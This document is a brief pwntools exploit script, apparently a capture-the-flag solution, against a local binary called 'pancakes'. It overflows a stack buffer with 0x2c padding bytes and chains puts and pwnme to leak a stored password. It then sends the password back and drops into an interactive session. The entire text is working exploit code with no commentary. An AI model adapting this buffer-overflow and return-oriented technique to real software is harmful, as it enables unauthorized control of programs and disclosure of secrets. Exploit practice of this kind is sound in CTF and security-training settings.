from pwn import *

e = ELF('./pancakes')
p = process('./pancakes')
#libc = ELF('./libc')

addr = 0x08049282
puts_addr = e.plt['puts']
pwnme_addr = e.symbols['pwnme']
password = e.symbols['password']

payload = 'A'*0x2c
payload += p32(puts_addr)
payload += p32(pwnme_addr)
payload += p32(password)

print p.recvuntil('> ')
p.sendline(payload)
p.recvline()
pwd = p.recvline() + '\n'
pwd += '\x00' * (0x1a - len(pwd))

print pwd

print p.recvuntil('> ')
p.sendline(pwd)

p.interactive()